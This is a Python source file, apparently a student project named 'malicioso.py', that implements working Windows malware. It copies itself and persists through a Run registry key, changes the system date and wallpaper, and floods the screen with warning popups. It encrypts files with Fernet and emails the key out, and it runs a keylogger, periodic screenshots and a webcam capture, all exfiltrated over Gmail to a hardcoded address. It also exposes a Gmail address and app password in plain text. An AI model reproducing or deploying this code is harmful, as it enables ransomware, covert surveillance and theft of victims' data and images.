import shutil
import os
import io
import win32gui
import time
from PIL import ImageGrab
import time
import threading
import keyboard
import pygetwindow as gw
import keyboard
import winreg
import random
import socket
from datetime import datetime, timedelta
import cv2
import tkinter as tk
import threading
from cryptography.fernet import Fernet
from enviarCorreo import enviar_correo_gmail, capture_keystrokes

current_path = os.getcwd()
file_name = "malicioso.py"
software_path = os.path.join(current_path, file_name)
titulo_app = "Calculator"
sender_email = "correopruebaapp1232@gmail.com"
sender_password = "bppkulqqfgflqypz"
receiver_email = "williamchawillferferreira@gmail.com"

# 1. Copy malware to \\%windows%\DOWNLOAD at a specific date and time
def copy_software(): 
    fecha_hora_ejecucion = None
    minutos_despues = 2

    # Verifica si se proporcionó una fecha y hora específica
    if fecha_hora_ejecucion:
        # Convierte la fecha y hora en formato de cadena a un objeto datetime
        fecha_hora_ejecucion = datetime.strptime(fecha_hora_ejecucion, "%Y-%m-%d %H:%M:%S")
    else:
        print('este es')
        # Calcula la fecha y hora de ejecución sumando los minutos deseados a la hora actual
        fecha_hora_ejecucion = datetime.now() + timedelta(minutes=minutos_despues)

    # Obtiene la diferencia de tiempo entre la fecha y hora de ejecución y la hora actual
    tiempo_espera = (fecha_hora_ejecucion - datetime.now()).total_seconds()

    # Verifica si la diferencia de tiempo es negativa (es decir, la fecha y hora de ejecución ya ha pasado)
    if tiempo_espera < 0:
        print("La fecha y hora de ejecución ya ha pasado.")
    else:
        # Espera el tiempo necesario antes de ejecutar la función
        time.sleep(tiempo_espera)

        # Ejecuta la función copy_software()
        download_folder = os.path.expandvars("%USERPROFILE%\\Downloads")
        shutil.copy2(software_path, download_folder)

# 2. Cuando usuario reinicie el equipo, el malware modifique la fecha y hora del sistema, 
# atrasándole un día y cambie el fondo de pantallas 
# por una imagen que diga “USTED HA SIDO INFECTADO”
def modify_system():
    fecha_actual = datetime.now()
    date_to_set = (fecha_actual - timedelta(days=1)).strftime('%d-%m-%Y') # Format: 'MM-DD-YYYY'
    time_to_set = fecha_actual.strftime('%H:%M:%S')  # Format: 'HH:MM:SS'
    wallpaper_name = "wallpaperMalicioso.jpeg"
    wallpaper_path = os.path.join(current_path, wallpaper_name)
    system_date_cmd = "date " + date_to_set
    system_time_cmd = "time " + time_to_set
    set_wallpaper_cmd = 'reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "{}" /f'.format(wallpaper_path)

    os.system(system_date_cmd)
    os.system(system_time_cmd)
    os.system(set_wallpaper_cmd)
    os.system("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters")

    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
    winreg.SetValueEx(key, "malicioso.py", 0, winreg.REG_SZ, current_path)
    winreg.CloseKey(key)

#3-    Que cuando el usuario presione “control + C”, se desplieguen en pantalla una gran cantidad de pantallas
#  diciendo “usted ha sido infectado por un malware divertido”, 
# y que ralentice el teclado y el mouse.

def display_warning():
    print('Entre al Warning')
    message = "Usted ha sido infectado"
    number_of_windows = 10  # Specify the desired number of warning windows
    window_width = 350
    window_height = 200

    root = tk.Tk()
    root.attributes('-fullscreen', True)  # Open the warning windows in fullscreen mode

    for _ in range(number_of_windows):
        print('Entre al for')
        x = random.randint(0, root.winfo_screenwidth() - window_width)
        y = random.randint(0, root.winfo_screenheight() - window_height)

        warning_window = tk.Toplevel(root)
        warning_window.title("Warning")
        warning_window.attributes('-topmost', True)
        warning_window.geometry(f"{window_width}x{window_height}+{x}+{y}")
        warning_label = tk.Label(warning_window, text=message, font=("Arial", 16), fg="red")
        warning_label.pack()

    root.mainloop()

def start_troll_interaction():
    while True:
        keyboard.add_hotkey('ctrl + c', display_warning)

        # Set the duration for the troll interaction in seconds
        duration = 5

        # Wait for the specified duration before terminating the program
        time.sleep(duration)
        # sys.exit()

# # 4. Encrypt files in the specified path and send the encryption key to the attacker's server
def my_function():
    # Your code here
    print("Windows Calculator is opened!")

def encrypt_files(path):
    # Step 2: Retrieve the path of the files you wish to encrypt
    file_list = os.listdir(path)

    # Step 3: Generate a random encryption key
    key = Fernet.generate_key()
    encryption_key = Fernet(key)

    # Step 4: Traverse through the files and apply encryption
    for file_name in file_list:
        file_path = os.path.join(path, file_name)

        # Encrypt only if it's a file (not a directory)
        if os.path.isfile(file_path):
            with open(file_path, 'rb') as file:
                original_data = file.read()
                encrypted_data = encryption_key.encrypt(original_data)

            # Save the encrypted data back to the file
            with open(file_path, 'wb') as file:
                file.write(encrypted_data)

    # Step 5: Log the encryption key
    title = 'Clave de Desencriptacion del dispositivo: ' + socket.gethostname()

    enviar_correo_gmail(sender_email,sender_password,receiver_email,title,key.decode())
    print("Encryption Key:", key.decode())

def check_calculator():
    abierta = True
    while abierta:
        print('esperando')
        ventana = win32gui.FindWindow(None, titulo_app)
        print(ventana)
        # Check if the Calculator is open
        if ventana != 0:
            path_archivo = os.path.join(current_path,"archivos encriptados")
            my_function()
            encrypt_files(path_archivo)
            abierta = False
        time.sleep(0.5) 


# # 5. Take screenshots every 1 minute, capture keystrokes every 10 seconds, and send them to the attacker's server
def take_screenshot():
    # Step 1: Take a screenshot
    image = ImageGrab.grab()
    nombre_foto = "foto-"+str(datetime.now().strftime("%Y-%m-%d%H-%M-%S")) + ".png"
    ruta_foto = os.path.join(current_path,'screenshots',nombre_foto)
    image.save(ruta_foto)
    bytes = io.BytesIO()
    image.save(bytes, format='PNG')
    subject = "Foto capturada de: " + socket.gethostname()
    contenido_imagen = bytes.getvalue()
    enviar_correo_gmail(sender_email, sender_password, receiver_email, subject, "ScreenShot Capturada Adjunta",contenido_imagen)

def ejec_screenshot():
    while True:
        print('tirando sc')
        take_screenshot()
        time.sleep(60)
    
def capture_keystrokes():
    keystrokes = ""
    stop_key_combination = ["k"]
    sal = False
    while True:
        event = keyboard.read_event()
        
        # Verificar si se presiona la combinación para detener el keylogger
        if event.event_type == keyboard.KEY_DOWN and event.name == "w":
            while True:
                a = 0
                event2 = keyboard.read_event()
                if event2.event_type == keyboard.KEY_DOWN and event2.name == 'k':
                    print ("Keylogger detenido. Las pulsaciones se guardaron en keylog.txt")
                    sal = True
                    a = 1
                elif event2.event_type == keyboard.KEY_DOWN:
                    if event.name == "space":
                        keystrokes += " "
                        print("Espacio encontrado2.00")
                    else:
                        keystrokes += event.name
                        print("Letra encontrada2.0000")
                    a = 1
                if a == 1:
                    break
        if(sal == True):
            break
        if event.event_type == keyboard.KEY_DOWN:
            if event.name == "space":
                keystrokes += " "
                print("Espacio encontrado")
            else:
                keystrokes += event.name
                print("Letra encontrada")

    with open("keylog.txt", "w") as file:
        file.write(keystrokes)
        print("Keylogger detenido. Las USTED HA SIDO INFECTADO POR UN KEYLOGGER DESARROLLADO POR RADIATION WASCALS")
    
def execute_every_10_seconds():
    while True:
        capture_keystrokes()
        time.sleep(10)

def check_ctrl_v():
    while True:
        if keyboard.is_pressed("ctrl") and keyboard.is_pressed("v"):     
            print('control v presionado')
            thread_keylogger = threading.Thread(target=execute_every_10_seconds)
            thread_keylogger.start()
            thread_sc = threading.Thread(target=ejec_screenshot)
            thread_sc.start()

# 6. Attempt to activate the camera, take a photo, and send it to the attacker's server
def capture_and_send_email():
    # Acceder a la cámara y tomar una foto
    camera = cv2.VideoCapture(0)
    _, image = camera.read()
    cv2.imwrite("captured_image.jpg", image)
    camera.release()

    # Configurar los detalles del correo electrónico
    subject = "Foto capturada de: " + socket.gethostname()
    body = "Adjunto encontrarás la foto capturada."

    # Enviar el correo electrónico con la foto adjunta
    with open("captured_image.jpg",'rb') as file:
        contenido_adjunto = file.read()
       
    enviar_correo_gmail(sender_email, sender_password, receiver_email, subject, "Imagen Capturada Adjunta",contenido_adjunto)

    print("Foto capturada y enviada por correo electrónico.")

def check_ctrl_x():
    while True:
        event = keyboard.read_event()
        if keyboard.is_pressed("ctrl") and keyboard.is_pressed("x"):
            capture_and_send_email()


if __name__ == "__main__":

    print('keyboard waiting...')
    thread1_copia = threading.Thread(target=copy_software)
    thread1_copia.start()
    # modify_system()
    thread3_pantallas = threading.Thread(target=start_troll_interaction)
    thread3_pantallas.start()

    thread4_calculator= threading.Thread(target=check_calculator)
    thread4_calculator.start()
    print('esperando')
    thread5_keyloggerAndSc = threading.Thread(target=check_ctrl_v)
    thread5_keyloggerAndSc.start()

    thread6_capturefromCamera = threading.Thread(target=check_ctrl_x)
    thread6_capturefromCamera.start()
    
